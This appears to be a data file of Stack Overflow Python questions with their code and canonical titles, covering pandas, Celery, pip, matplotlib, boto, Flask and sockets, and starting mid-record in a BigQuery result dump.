u'v': u'the' }, { u'v': u'633' }, { u'v': u'1599' } ] }, { u'f': [ { u'v': u'the' }, { u'v': u'616' }, { u'v': u'1596' } ] }, { u'f': [ { u'v': u'the' }, { u'v': u'614' }, { u'v': u'1596' } ] }, { u'f': [ { u'v': u'the' }, { u'v': u'612' }, { u'v': u'1595' } ] }, { u'f': [ { u'v': u'the' }, { u'v': u'607' }, { u'v': u'1603' } ] }, { u'f': [ { u'v': u'the' }, { u'v': u'579' }, { u'v': u'1593' } ] }, { u'f': [ { u'v': u'the' }, { u'v': u'570' }, { u'v': u'1600' } ] }, { u'f': [ { u'v': u'the' }, { u'v': u'541' }, { u'v': u'1599' } ] }, { u'f': [ { u'v': u'the' }, { u'v': u'525' }, { u'v': u'1608' } ] }, { u'f': [ { u'v': u'the' }, { u'v': u'520' }, { u'v': u'1599' } ] }, { u'f': [ { u'v': u'the' }, { u'v': u'518' }, { u'v': u'1602' } ] }, { u'f': [ { u'v': u'the' }, { u'v': u'486' }, { u'v': u'1595' } ] }, { u'f': [ { u'v': u'the' }, { u'v': u'470' }, { u'v': u'1593' } ] }, { u'f': [ { u'v': u'the' }, { u'v': u'433' }, { u'v': u'1609' } ] }, { u'f': [ { u'v': u'the' }, { u'v': u'429' }, { u'v': u'1607' } ] }, { u'f': [ { u'v': u'the' }, { u'v': u'421' }, { u'v': u'1611' } ] }, { u'f': [ { u'v': u'the' }, { u'v': u'399' }, { u'v': u'1592' } ] }, { u'f': [ { u'v': u'the' }, { u'v': u'363' }, { u'v': u'0' } ] }, { u'f': [ { u'v': u'the' }, { u'v': u'353' }, { u'v': u'1594' } ] }, { u'f': [ { u'v': u'the' }, { u'v': u'287' }, { u'v': u'1609' } ] }, { u'f': [ { u'v': u'the' }, { u'v': u'106' }, { u'v': u'0' } ] }, { u'f': [ { u'v': u'the' }, { u'v': u'57' }, { u'v': u'1609' } ] } ], u'jobReference': { u'projectId': u'670640819051', u'jobId': u'job_5bf745fcee8b470e997d8ea90f380e68' }, u'jobComplete': True, u'totalRows': u'42', u'schema': { u'fields': [ { u'type': u'STRING', u'name': u'word', u'mode': u'NULLABLE' }, { u'type': u'INTEGER', u'name': u'word_count', u'mode': u'NULLABLE' }, { u'type': u'INTEGER', u'name': u'corpus_date', u'mode': u'NULLABLE' } ] }} [ {'count': 200, 'year': 2008}, {'count': 240, 'year': 2010}, {'count': 290, 'year': 2009}] [{u'v': u'the'}, {u'v': u'995'}, {u'v': u'1600'}]",Parsing data to create a json data object with Python
PySide: Replace CentralWidget in MainWindow," I'm kinda new to PySide.I have a main window object which shows one widget at a time. I've been trying to change the central widget of the QMainWindow class in order to replace the visible Widget in the window when pressing a button. The problem is that the button pressed is in the Widget class, not in the main window class.say... The pressed button is in the login_screen instance. The method called when the button is clicked is inside the LoginScreen class: Setting the parent widget to None removes the widget (login_screen) from the main window. What should I do in order to get another widget (e.g. logged_in_screen) as the central widget of the main window when the loginButton (inside the login_screen widget) is pressed?Maybe the login method should be inside the main window class? If so, how can I connect the buttons pressed in login_screen with the main window's method? <code>  class App(QtGui.QMainWindow): def __init__(self): super(App, self).__init__() self.initUI() def initUI(self): self.statusBar().showMessage('Listo.') #Status Bar self.login_screen = LoginScreen() self.logged_in_screen = LoggedInScreen() self.setCentralWidget(self.login_screen) self.setGeometry(300, 300, 450, 600) #Window Size self.setWindowTitle('PyTransactio - Client') #Window Title self.setWindowIcon(QtGui.QIcon('icon.png')) #App Icon self.show() def login(self): """""" Send login data to the server in order to log in """""" #Process self.setParent(None)",Replace CentralWidget in MainWindow
A error when starting Celery from a command live: AttributeError: 'module' object has no attribute 'celery'," I try to start a Celery worker server from a command line: The code in tasks.py: I get the next error: Does anybody know why the 'celery' attribute cannot be found? Thank you for help.The operating system is Linux Debian 5.Edit. May be the clue. Could anyone explain me the next comment to a function (why we must be sure that it finds modules in the current directory)? <code>  celery -A tasks worker --loglevel=info import osos.environ[ 'DJANGO_SETTINGS_MODULE' ] = ""proj.settings""from celery import task@task()def add_photos_task( lad_id ):... Traceback (most recent call last): File ""/usr/local/bin/celery"", line 8, in <module> load_entry_point('celery==3.0.12', 'console_scripts', 'celery')() File ""/usr/local/lib/python2.7/site-packages/celery-3.0.12-py2.7.egg/celery/__main__.py"", line 14, in main main() File ""/usr/local/lib/python2.7/site-packages/celery-3.0.12-py2.7.egg/celery/bin/celery.py"", line 946, in main cmd.execute_from_commandline(argv) File ""/usr/local/lib/python2.7/site-packages/celery-3.0.12-py2.7.egg/celery/bin/celery.py"", line 890, in execute_from_commandline super(CeleryCommand, self).execute_from_commandline(argv))) File ""/usr/local/lib/python2.7/site-packages/celery-3.0.12-py2.7.egg/celery/bin/base.py"", line 177, in execute_from_commandline argv = self.setup_app_from_commandline(argv) File ""/usr/local/lib/python2.7/site-packages/celery-3.0.12-py2.7.egg/celery/bin/base.py"", line 295, in setup_app_from_commandline self.app = self.find_app(app) File ""/usr/local/lib/python2.7/site-packages/celery-3.0.12-py2.7.egg/celery/bin/base.py"", line 313, in find_app return sym.celeryAttributeError: 'module' object has no attribute 'celery' # from celery/utils/imports.pydef import_from_cwd(module, imp=None, package=None): """"""Import module, but make sure it finds modules located in the current directory. Modules located in the current directory has precedence over modules located in `sys.path`. """""" if imp is None: imp = importlib.import_module with cwd_in_path(): return imp(module, package=package)",Starting Celery: AttributeError: 'module' object has no attribute 'celery'
install from a git subdirectory with pip," I have a git repository with many folders, one of them being a python module installable with pip, like this: Right now I have to do the following to install: Is it possible to install the module directly with pip without explicitly cloning ?I tried: But I get: <code>  repo.git/repo.git/folder1/repo.git/folder2/repo.git/mymodule/repo.git/mymodule/__init__.pyrepo.git/mymodule/setup.pyrepo.git/mymodule/... git clone http://server/repo.gitcd repopip install mymodulecd ..rm -rf repo pip install git+https://server/repo.git/mymodule/pip install git+https://server/repo.git:mymodule/ IOError: [Errno 2] No such file or directory: '/tmp/pip-88tlLm-build/setup.py'",How can I install from a git subdirectory with pip?
convert DataFrameGroupBy object to DataFrame pandas, I had a dataframe and did a groupby in FIPS and summed the groups that worked fine. I just want a normal Dataframe back but I have a pandas.core.groupby.DataFrameGroupBy object.  <code>  kl = ks.groupby('FIPS')kl.aggregate(np.sum),Convert DataFrameGroupBy object to DataFrame pandas
"Launch EC2 instance with Boto, specifying size of EBS"," I'm using boto/python to launch a new EC2 instance that boots from an EBS volume. At the time I launch the instance, I'd like to override the default size of the booting EBS volume. I found no boto methods or parameters that might fit into my launch code: This web page shows how to increase the size of a running EC2-instance's EBS volume using command-line tools, but I'd like to use boto at the time the EC2 instance is specified: <code>  ec2 = boto.connect_ec2( ACCESS_KEY, SECRET_KEY, region=region )reservation = ec2.run_instances( image_id=AMI_ID, key_name=EC2_KEY_HANDLE, instance_type=INSTANCE_TYPE, security_groups = [ SECGROUP_HANDLE, ] )","How to launch EC2 instance with Boto, specifying size of EBS?"
"cx_Oracle dll load failed; instant client installed, ORACLE_HOME path correct...missing MSVCR90 and others"," I'm getting the standard ""DLL load failed; module not found"" error when trying to import cx_Oracle. I have the proper instant client installed, the paths are all correct... running Dependency Walker tells me I'm missing the following .dll'sMSVCR90, GPSVC, IESHIMS.I'm running the instant client for Oracle 11g and Python 2.7. Anyone have any ideas? Most of the answers I have found entail an incorrect path, but that doesn't seem to be the case... additionally, I can't find any of those .dll's anywhere else on my system. EDIT:I ended up installing Oracle XE 11g (32 bit); both Python 2.7 and the cx_Oracle are also 32 bit (I should also add that I'm on Windows). cx_Oracle now installs cleanly; however upon connection I receive an error: The ORACLE_HOME path is correct, as is the bin in the PATH folder...  <code>  InterfaceError: Unable to acquire Oracle environment handle",InterfaceError: Unable to acquire Oracle environment handle; ORACLE_HOME is correct and SQL*Plus will connect
How to set breakpoint in another module," I'm trying to debug a module ""main"", which calls a function ""broken_function"" at line 356 of ""another_module"". I'm having an error in that function and want to put a breakpoint at its start. Below is the listing. Am I doing something wrong? Cause, the breakpoint doesn't work: <code>  $ python -m pdb main(Pdb) import sys(Pdb) sys.path.append(""/home/user/path/to/another/module"")(Pdb) import another_module(Pdb) b another_module:356Breakpoint 1 at /home/user/path/to/another/module/another_module.py:356(Pdb) cTraceback (most recent call last):...File ""/home/user/path/to/another/module/another_module.py"", line 383, in broken_functionf=open(""../jobs/temptree.tre"", ""r"")IOError: [Errno 2] No such file or directory: '../jobs/temptree.tre'Uncaught exception. Entering post mortem debugging...","How to set breakpoint in another module (don't set it on function definition line, if you want to break when function starts being executed)"
how do i check if int if between the range of two numbers (tried various solutions before)?," How do I determine whether a given integer is between two other integers (e.g. greater than/equal to 10000 and less than/equal to 30000)?I'm using 2.3 IDLE and what I've attempted so far is not working: <code>  if number >= 10000 and number >= 30000: print (""you have to pay 5% taxes"")",Determine Whether Integer Is Between Two Other Integers?
how do i check if int is between the range of two numbers (tried various solutions before)?," How do I determine whether a given integer is between two other integers (e.g. greater than/equal to 10000 and less than/equal to 30000)?I'm using 2.3 IDLE and what I've attempted so far is not working: <code>  if number >= 10000 and number >= 30000: print (""you have to pay 5% taxes"")",Determine Whether Integer Is Between Two Other Integers?
How do I check if int is between the range of two numbers?," How do I determine whether a given integer is between two other integers (e.g. greater than/equal to 10000 and less than/equal to 30000)?I'm using 2.3 IDLE and what I've attempted so far is not working: <code>  if number >= 10000 and number >= 30000: print (""you have to pay 5% taxes"")",Determine Whether Integer Is Between Two Other Integers?
How do I check whether an int is between the two numbers?," How do I determine whether a given integer is between two other integers (e.g. greater than/equal to 10000 and less than/equal to 30000)?I'm using 2.3 IDLE and what I've attempted so far is not working: <code>  if number >= 10000 and number >= 30000: print (""you have to pay 5% taxes"")",Determine Whether Integer Is Between Two Other Integers?
How to implement optional first argument in Python (reproduce slice() behavior)," Possible Duplicate:How can the built-in range function take a single argument or three?The Python documentation for slice() lists the following method signatures:slice(stop)slice(start, stop[, step])Here are a few examples of creating a slice object with different numbers of arguments: Note that if you call slice() with a single argument, that argument is used as the stop attribute (second argument with the two or three argument signature).Since function overloading does not exist in Python, the typical way to allow a variable number of arguments is to use None as a default value, for example one attempt to reproduce the above behavior would be the following: However this assumes that None is not a value that could be provided for stop, note the following difference in behavior between my implementation and slice(): Is there some other value that I could use in place of None that would indicate that the parameter was definitely not provided? Alternatively, is there a different way to implement this behavior other than default argument values?Edit: By the way, in CPython, slice() is implemented in C. <code>  >>> slice(8)slice(None, 8, None)>>> slice(4, 8)slice(4, 8, None)>>> slice(4, 8, 2)slice(4, 8, 2) class myslice(object): def __init__(self, start, stop=None, step=None): if stop is None and step is None: # only one argument was provided, so use first argument as self.stop self.start = None self.stop = start else: self.start = start self.stop = stop self.step = step def __repr__(self): return 'myslice({}, {}, {})'.format(self.start, self.stop, self.step) >>> slice(1, None)slice(1, None, None)>>> myslice(1, None)myslice(None, 1, None)",How to implement optional first argument (to reproduce slice() behavior)
Is it possible to make abstract classes in python?," How can I make a class or method abstract in Python?I tried redefining __new__() like so: but now if I create a class G that inherits from F like so: then I can't instantiate G either, since it calls its super class's __new__ method.Is there a better way to define an abstract class? <code>  class F: def __new__(cls): raise Exception(""Unable to create an instance of abstract class %s"" %cls) class G(F): pass",Is it possible to make abstract classes in Python?
Specifying and saving a figure with size specified in pixels," Say I have an image of size 3841 x 7195 pixels. I would like to save the contents of the figure to disk, resulting in an image of the exact size I specify in pixels.No axis, no titles. Just the image. I don't personally care about DPIs, as I only want to specify the size the image takes in the screen in disk in pixels.I have read other threads, and they all seem to do conversions to inches and then specify the dimensions of the figure in inches and adjust dpi's in some way. I would like to avoid dealing with the potential loss of accuracy that could result from pixel-to-inches conversions.I have tried with: with no luck (Python complains that width and height must each be below 32768 (?))From everything I have seen, matplotlib requires the figure size to be specified in inches and dpi, but I am only interested in the pixels the figure takes in disk. How can I do this?To clarify: I am looking for a way to do this with matplotlib, and not with other image-saving libraries. <code>  w = 7195h = 3841fig = plt.figure(frameon=False)fig.set_size_inches(w,h)ax = plt.Axes(fig, [0., 0., 1., 1.])ax.set_axis_off()fig.add_axes(ax)ax.imshow(im_np, aspect='normal')fig.savefig(some_path, dpi=1)",Specifying and saving a figure with exact size in pixels
Specifying and saving a figure with size in pixels," Say I have an image of size 3841 x 7195 pixels. I would like to save the contents of the figure to disk, resulting in an image of the exact size I specify in pixels.No axis, no titles. Just the image. I don't personally care about DPIs, as I only want to specify the size the image takes in the screen in disk in pixels.I have read other threads, and they all seem to do conversions to inches and then specify the dimensions of the figure in inches and adjust dpi's in some way. I would like to avoid dealing with the potential loss of accuracy that could result from pixel-to-inches conversions.I have tried with: with no luck (Python complains that width and height must each be below 32768 (?))From everything I have seen, matplotlib requires the figure size to be specified in inches and dpi, but I am only interested in the pixels the figure takes in disk. How can I do this?To clarify: I am looking for a way to do this with matplotlib, and not with other image-saving libraries. <code>  w = 7195h = 3841fig = plt.figure(frameon=False)fig.set_size_inches(w,h)ax = plt.Axes(fig, [0., 0., 1., 1.])ax.set_axis_off()fig.add_axes(ax)ax.imshow(im_np, aspect='normal')fig.savefig(some_path, dpi=1)",Specifying and saving a figure with exact size in pixels
Can i use different databases for different apps in django," I have multiple apps in my Django site: mainsite, blog and tutorials.Can I use different databases (e.g. PostgreSQL, MySQL) in different Django apps? <code> ",Different databases for different apps in Django
PIL cut off letters," I've spent a lot of time making my first web application using Python, and I'm using pil for generating images. After reading a lot, I've managed to implement proper text aligning, wrapping, generating files with many extensions etc. However, all the text generated by PIL is cut off at the top. Here's a sample.It should say jygpq in a variety of fonts (the font names are on the left).I've found few posts here: fonts clipping with PIL, but I'd like to avoid using another module (aggdraw); since I've figured out so many things in PIL already I'd like to stick to that.I've tried many fonts in different sizes, but text is still cut off. I even tried to use PIL fonts, but it still doesn't work. [Also converting OTF to BDF, and to PIL].This is on Ubuntu. What should I try next? <code> ",PIL cuts off top of letters
How to delete rows from a pandas DataFrame based on a conditional expression," I have a pandas DataFrame and I want to delete rows from it where the length of the string in a particular column is greater than 2.I expect to be able to do this (per this answer): but I just get the error: What am I doing wrong?(Note: I know I can use df.dropna() to get rid of rows that contain any NaN, but I didn't see how to remove rows based on a conditional expression.) <code>  df[(len(df['column name']) < 2)] KeyError: u'no item named False'",How to delete rows from a pandas DataFrame based on a conditional expression
Delete rows from a pandas DataFrame based on a conditional expression involving len(string) giving KeyError," I have a pandas DataFrame and I want to delete rows from it where the length of the string in a particular column is greater than 2.I expect to be able to do this (per this answer): but I just get the error: What am I doing wrong?(Note: I know I can use df.dropna() to get rid of rows that contain any NaN, but I didn't see how to remove rows based on a conditional expression.) <code>  df[(len(df['column name']) < 2)] KeyError: u'no item named False'",How to delete rows from a pandas DataFrame based on a conditional expression
How to get object from pk inside django template," Inside django template, I would like to get object's name using object's pk. For instance, given that I have pk of object from class A, I would like to do something like the following: How can I do this? <code>  {{ A.objects.get(pk=A_pk).name }}",How to get object from PK inside Django template?
List += iterable in Python," It would appear that in Python, list += x works for any iterable x: Is this behaviour documented anywhere?To contrast this with list + x, the latter only works if x is also a list. This is spelled out in the documentation. <code>  In [6]: l = []In [7]: l += [1]In [8]: l += (2, 3)In [9]: l += xrange(5)In [10]: lOut[10]: [1, 2, 3, 0, 1, 2, 3, 4]",Is the behaviour of Python's list += iterable documented anywhere?
Is the result of Python's list += iterable documented anywhere?," It would appear that in Python, list += x works for any iterable x: Is this behaviour documented anywhere?To contrast this with list + x, the latter only works if x is also a list. This is spelled out in the documentation. <code>  In [6]: l = []In [7]: l += [1]In [8]: l += (2, 3)In [9]: l += xrange(5)In [10]: lOut[10]: [1, 2, 3, 0, 1, 2, 3, 4]",Is the behaviour of Python's list += iterable documented anywhere?
"Difference between union() and union_update() in sets, and others?"," Python sets have these methods: Likewise, there's also these: And so on, for all the standard relational algebra operations.What exactly is the difference here? I see that it says that the update() versions returns s instead of a new set, but if I write x = s.update(t), does that means that id(x) == id(s)? Are they references to the same object now?Why are both sets of methods implemented? It doesn't seem to add any significant functionality. <code>  s.union(t) s | t new set with elements from both s and ts.update(t) s |= t return set s with elements added from t s.intersection_update(t) s &= t return set s keeping only elements also found in ts.intersection(t) s & t new set with elements common to s and t","Difference between union() and update() in sets, and others?"
sort_options only applied when query_string is not empty? (Python / Search API / GAE)," trying to figure out whether this is a bug or by design. when no query_string is specified for a query, the SearchResults object is NOT sorted by the requested column. for example, here is some logging to show the problem:Results are returned unsorted on return index.search(query):query_string = ''sort_options string: search.SortOptions(expressions=[search.SortExpression(expression=u'firstname', direction='ASCENDING', default_value=u'')], limit=36)Results are returned sorted on return index.search(query):query_string = 'test'sort_options string: search.SortOptions(expressions=[search.SortExpression(expression=u'firstname', direction='ASCENDING', default_value=u'')], limit=36)This is how I'm constructing my query for both cases (options has limit, offset and sort_options parameters):query = search.Query(query_string=query_string, options=options) <code> ",sort_options only applied when query_string is not empty?
graph-tool: Draw text on edges," for my thesis I need to draw some probabilistic control flow graphs. i.e. control flow graphs with probabilities depicted on the edges.I found graph-tool which seems quite useful, since it can use deep-copies of existing graphs and my graphs are quite similar.So my question is, if there is a possibility to draw edge properties (or some strings) on/next to the edges? If it's not possible or highly complicated, is there a tool which is better to use in this case?Edit:I need directed edges that can even create loops between 2 nodes and have different values. Is there a possibility for this too? So I can see both values? By now I can see the directed graph with a 2-directional edge, but there's only one value on it.So e.g. in networkx (in reference to Hooked) it would look like: So that both 'foo' and 'bar' are visible and you can see which direction they are connected to.But as networkx renders it, I get 1 bidirectional edge with 1 of the labels. <code>  G = nx.MultiDiGraph()G.add_edge(0,1)G.add_edge(1,0)labels = {(0,1):'foo', (1,0):'bar'}",networkx: Draw text on edges
"keep a figure ""on hold"" after running script"," I have this Python code: If I do all these steps via an Ipython terminal, I can keep the figure open and interact with it. However, if I run the script via $python script.py the figure opens and closes instantly.How could I have the same behavior as the Ipython terminal but when run as a script? <code>  from pylab import *from numpy import *time=linspace(-pi,pi,10000)ycos=cos(time)ysin=sin(time)plot(time,ycos)plot(time,ysin)show()","Keep a figure ""on hold"" after running a script"
Python: find common keys and sort by value," I want to create a finalDic which contains common keys and sum of their values First find common keys Then Sum and sort by their values I've tried this and not even close what i want Thanks <code>  myDic = [{2:1, 3:1, 5:2}, {3:4, 6:4, 2:3}, {2:5, 3:6}, ...] commonkey = [{2:1, 3:1}, {2:3, 3:4}, {2:5, 3:6}] finalDic= {3:11, 2,9} import collectionsmyDic = [{2:1, 3:1, 5:2}, {3:4, 6:4, 2:3}, {2:5, 3:6}]def commonKey(x): i=0 allKeys = [] while i<len(x): for key in x[0].keys(): allKeys.append(key) i=i+1 commonKeys = collections.Counter(allKeys) commonKeys = [i for i in commonKeys if commonKeys[i]>len(x)-1] return commonKeysprint commonKey(myDic)",How to find common keys in a list of dicts and sort them by value?
Sending data between two computers by sockets. Python," I am working on a script that would transmit the data between two distinct computers with access to the internet. I am using python's socket standard module. It works fine when I run both client and server on single computer but I am not able to make the things work when they run on different computers. Here is a part of my server code: And here is a part of my client code: When I run these scripts on two different computers with internet access the client is unable to connect and raises an error and the server is waiting for connections forever. What am I doing wrong? <code>  import socket, time,os, randomclass Server(): def __init__(self,Adress=('',5000),MaxClient=1): self.s = socket.socket() self.s.bind(Adress) self.s.listen(MaxClient) def WaitForConnection(self): self.Client, self.Adr=(self.s.accept()) print('Got a connection from: '+str(self.Client)+'.')s = Server()s.WaitForConnection() import socketclass Client(): def __init__(self,Adress=(""Here is the IP of the computer on which the \ server scrip is running"",5000)): self.s = socket.socket() self.s.connect(Adress)c = Client()",Python: sending data between two computers via sockets
How to create a new unknown or dynamic object in Python (expando)," In python how can we create a new object without having a predefined Class and later dynamically add properties to it ?example: What is the best way to do it?EDIT Because many people advised in comments that I might not need this. The thing is that I have a function that serializes an object's properties. For that reason, I don't want to create an object of the expected class due to some constructor restrictions, but instead create a similar one, let's say like a mock, add any ""custom"" properties I need, then feed it back to the function. <code>  dynamic_object = Dynamic()dynamic_object.dynamic_property_a = ""abc""dynamic_object.dynamic_property_b = ""abcdefg""",How to create a new unknown or dynamic/expando object in Python
Python Pyplot Bar Plot bars disapear when using log scale," I have the following data: I have the following code to create a bar plot: This creates the following graph:If I remove the ""plt.yscale('log')"" line then I get full bars. However because I want to add other lines I really need this to have a logarithmic y scale. Based on some searching I believe this is a bug in pyplot however I can't seem to find a resolution. Does anyone know how to get a logarithmic bar plot to actually show the bars? <code>  20120219,\\n,4316605320120220,\\n,4681326920120221,\\n,4727720420120222,\\n,4634455620120223,\\n,2692623620120224,\\n,647250620120225,\\n,3958047620120226,\\n,5596834220120227,\\n,3288994820120228,\\n,3211636120120229,\\n,3242482920120301,\\n,5612388920120302,\\n,6710245920120303,\\n,8168188520120304,\\n,8574002120120305,\\n,8387466820120306,\\n,8360668320120307,\\n,5666098120120308,\\n,4453466820120309,\\n,3753207120120310,\\n,3926024220120311,\\n,4049118620120312,\\n,3904108520120313,\\n,2701056220120314,\\n,4412190020120315,\\n,8775064520120316,\\n,8658852320120317,\\n,8612146920120318,\\n,8934350620120319,\\n,8919866420120320,\\n,90273127 import matplotlibmatplotlib.use('Agg')from matplotlib.mlab import csv2recimport matplotlib.pyplot as pltimport matplotlib.dates as mdatesfrom pylab import *from datetime import datetimeimport dateutilimport sysimport matplotlib.ticker as mtickery = [] input = open(sys.argv[1], 'r') data = csv2rec(input, names=['date', 'symbol', 'count']) for item in data['count']: y.append(item)time_vec = [datetime.strptime(str(x),'%Y%m%d') for x in data['date']]rcParams['figure.figsize'] = 18, 7rcParams['font.size'] = 8N = len(y)ind = range(N)fig = plt.figure() # Setup the figureax = fig.add_subplot(111) # Setup the subplotax.bar(ind, y, align='center') # Setup the Y Barsax.set_ylabel('Counts') ax.set_title('Collected By Day') ax.set_xticks(ind)ax.set_xticklabels(time_vec)ax.grid() fig.autofmt_xdate(bottom=0.2, rotation=90, ha='left')plt.yscale('log')plt.savefig(str(sys.argv[1] + "".png""))",Python Pyplot Bar Plot bars disappear when using log scale
python concatenating string print," gives me: What is the correct way to do this? <code>  print (""Tag Value "" + i.tags.get('Name')) File ""./boto_test.py"", line 19, in main print (""Tag Value"" + i.tags.get('Name'))TypeError: cannot concatenate 'str' and 'NoneType' objects",Concatenating strings then printing
assign a variable into `g` only once for application in Flask," I want to save an object which is the result of a expensive function.The expensive function should only be processed once before any request.I checked the document of Flask and considered about g for saving the result and @app.before_first_request decorator to define this assignment happended only once.My codes are like this: However, these codes won't work well. It works only in the first time test request is called. When I access ""myapplication/test"" second time, the g.rec doesn't exist, which will throw an exceptionDoes anyone have ideas about how to assign a global variable into g when initing the application? <code>  @app.before_first_requestdef before_first_request(): g.rec = take_long_time_to_do()@app.route('/test/')def test(): return render_template('index.html',var_rec=g.rec)",Assign a variable into `g` once and only once for application in Flask
assign a variable into `g` once and only once for application in Flask," I want to save an object which is the result of a expensive function.The expensive function should only be processed once before any request.I checked the document of Flask and considered about g for saving the result and @app.before_first_request decorator to define this assignment happended only once.My codes are like this: However, these codes won't work well. It works only in the first time test request is called. When I access ""myapplication/test"" second time, the g.rec doesn't exist, which will throw an exceptionDoes anyone have ideas about how to assign a global variable into g when initing the application? <code>  @app.before_first_requestdef before_first_request(): g.rec = take_long_time_to_do()@app.route('/test/')def test(): return render_template('index.html',var_rec=g.rec)",Assign a variable into `g` once and only once for application in Flask
Why collections.Counter is much slower then ''.count?," I have a simple task: To count how many times every letter occurs in a string. I've used a Counter() for it, but on one forum I saw information that using dict() / Counter() is much slower than using string.count() for every letter. I thought that it would interate through the string only once, and the string.count() solution would have to iterate through it four times (in this case). Why is Counter() so slow?  <code>  >>> timeit.timeit('x.count(""A"");x.count(""G"");x.count(""C"");x.count(""T"")', setup=""x='GAAAAAGTCGTAGGGTTCCTTCACTCGAGGAATGCTGCGACAGTAAAGGAGGCCACGTGGTTGAGAGTTCCTAAGCATTCGTATGTACACCCGGACTCGATGCACTCAAACGTGCTTAAGGGTAAAGAAGGTCGAGAGGTATACTGGGGCACTCCCCTTAGAATTATATCTTGGTCAACTACAATATGGATGGAAATTCTAAGCCGAAAACGACCCGCTAGCGGATTGTGTATGTATCACAACGGTTTCGGTTCATACGCAAAATCATCCCATTTCAAGGCCACTCAAGGACATGACGCCGTGCAACTCCGAGGACATCCCTCAGCGATTGATGCAACCTGGTCATCTAATAATCCTTAGAACGGATGTGCCCTCTACTGGGAGAGCCGGCTAGACTGGCATCTCGCGTTGTTCGTACGAGCTCCGGGCGCCCGGGCGGTGTACGTTGATGTACAGCCTAAGAGCTTTCCACCTATGCTACGAACTAATTTCCCGTCCATCGTTCCTCGGACTGAGGTCAAAGTAACCCGGAAGTACATGGATCAGATACACTCACAGTCCCCTTTAATGACTGAGCTGGACGCTATTGATTGCTTTATAAGTGTTATGGTGAACTCGAAGACTTAGCTAGGAATTTCGCTATACCCGGGTAATGAGCTTAATACCTCACAGCATGTACGCTCTGAATATATGTAGCGATGCTAGCGGAACGTAAGCGTGAGCGTTATGCAGGGCTCCGCACCTCGTGGCCACTCGCCCAATGCCCGAGTTTTTGAGCAATGCCATGCCCTCCAGGTGAAGCGTGCTGAATATGTTCCGCCTCCGCACACCTACCCTACGGGCCTTACGCCATAGCTGAGGATACGCGAGTTGGTTAGCGATTACGTCATTCCAGGTGGTCGTTC'"", number=10000)0.07911698750407936>>> timeit.timeit('Counter(x)', setup=""from collections import Counter;x='GAAAAAGTCGTAGGGTTCCTTCACTCGAGGAATGCTGCGACAGTAAAGGAGGCCACGTGGTTGAGAGTTCCTAAGCATTCGTATGTACACCCGGACTCGATGCACTCAAACGTGCTTAAGGGTAAAGAAGGTCGAGAGGTATACTGGGGCACTCCCCTTAGAATTATATCTTGGTCAACTACAATATGGATGGAAATTCTAAGCCGAAAACGACCCGCTAGCGGATTGTGTATGTATCACAACGGTTTCGGTTCATACGCAAAATCATCCCATTTCAAGGCCACTCAAGGACATGACGCCGTGCAACTCCGAGGACATCCCTCAGCGATTGATGCAACCTGGTCATCTAATAATCCTTAGAACGGATGTGCCCTCTACTGGGAGAGCCGGCTAGACTGGCATCTCGCGTTGTTCGTACGAGCTCCGGGCGCCCGGGCGGTGTACGTTGATGTACAGCCTAAGAGCTTTCCACCTATGCTACGAACTAATTTCCCGTCCATCGTTCCTCGGACTGAGGTCAAAGTAACCCGGAAGTACATGGATCAGATACACTCACAGTCCCCTTTAATGACTGAGCTGGACGCTATTGATTGCTTTATAAGTGTTATGGTGAACTCGAAGACTTAGCTAGGAATTTCGCTATACCCGGGTAATGAGCTTAATACCTCACAGCATGTACGCTCTGAATATATGTAGCGATGCTAGCGGAACGTAAGCGTGAGCGTTATGCAGGGCTCCGCACCTCGTGGCCACTCGCCCAATGCCCGAGTTTTTGAGCAATGCCATGCCCTCCAGGTGAAGCGTGCTGAATATGTTCCGCCTCCGCACACCTACCCTACGGGCCTTACGCCATAGCTGAGGATACGCGAGTTGGTTAGCGATTACGTCATTCCAGGTGGTCGTTC'"", number=10000)2.1727447831030844>>> 2.1727447831030844 / 0.0791169875040793627.462430656767047>>> ",Why is collections.Counter much slower than ''.count?
"Python weird error - ""List indices must be integers, not str"""," I have the following Python code : And I'm getting the following error: TypeError: list indices must be integers, not strI've been looking for an error close to mine, but not sure how to do it, never got that error. So yeah, how can I transform it to integers instead of string? I guess the problem comes from str(player['score']). <code>  currentPlayers = query.getPlayers() for player in currentPlayers: return str(player['name'])+"" ""+str(player['score'])","Python error when trying to access list by index - ""List indices must be integers, not str"""
"Python error when tryint to access list by index - ""List indices must be integers, not str"""," I have the following Python code : And I'm getting the following error: TypeError: list indices must be integers, not strI've been looking for an error close to mine, but not sure how to do it, never got that error. So yeah, how can I transform it to integers instead of string? I guess the problem comes from str(player['score']). <code>  currentPlayers = query.getPlayers() for player in currentPlayers: return str(player['name'])+"" ""+str(player['score'])","Python error when trying to access list by index - ""List indices must be integers, not str"""
combinatorial explosion when merging dataframes in pandas," I'm trying to merge a series of dataframes in pandas. I have a list of dfs, dfs and a list of their corresponding labels labels and I want to merge all the dfs into 1 df in such that the common labels from a df get the suffix from its label in the labels list. i.e.: When I try this, I get the error: I'm trying to make a series of merges that at each merge grows at most by number of columns N, where N is the number of columns in the ""next"" df in the list. The final DF should have as many columns as all the df columns added together, so it grow additively and not be combinatorial.The behavior I'm looking for is: Join dfs on the column names that are specified (e.g. specified by on=) or that the dfs are indexed by. Unionize the non-common column names (as in outer join). If a column appears in multiple dfs, optionally overwrite it. Looking more at the docs, it sounds like update might be the best way to do this. Though when I try join='outer' it raises an exception signaling that it's not implemented.EDIT: Here is my attempt at an implementation of this, which does not handle suffixes but illustrates the kind of merge I'm looking for: This assumes that the merging happens on the indices of each of the dfs. New columns are added in an outer-join style, but columns that are common (and not part of the index) are used in the join via the on= keyword.Example: The twist on this would be one where you arbitrarily tag a suffix to each df based on a set of labels for columns that are common, but that is less important. Is the above merge operation something that can be done more elegantly in pandas or that already exists as a builtin? <code>  def mymerge(dfs, labels): labels_dict = dict([(d, l) for d, l in zip(dfs, labels)]) merged_df = reduce(lambda x, y: pandas.merge(x, y, suffixes=[labels_dict[x], labels_dict[y]]), dfs) return merged_df pandas.tools.merge.MergeError: Combinatorial explosion! (boom) def my_merge(dfs_list, on): """""" list of dfs, columns to merge on. """""" my_df = dfs_list[0] for right_df in dfs_list[1:]: # Only put the columns from the right df # that are not in the existing combined df (i.e. new) # or which are part of the columns to join on new_noncommon_cols = [c for c in right_df \ if (c not in my_df.columns) or \ (c in on)] my_df = pandas.merge(my_df, right_df[new_noncommon_cols], left_index=True, right_index=True, how=""outer"", on=on) return my_df df1 = pandas.DataFrame([{""employee"": ""bob"", ""gender"": ""male"", ""bob_id1"": ""a""}, {""employee"": ""john"", ""gender"": ""male"", ""john_id1"": ""x""}])df1 = df1.set_index(""employee"")df2 = pandas.DataFrame([{""employee"": ""mary"", ""gender"": ""female"", 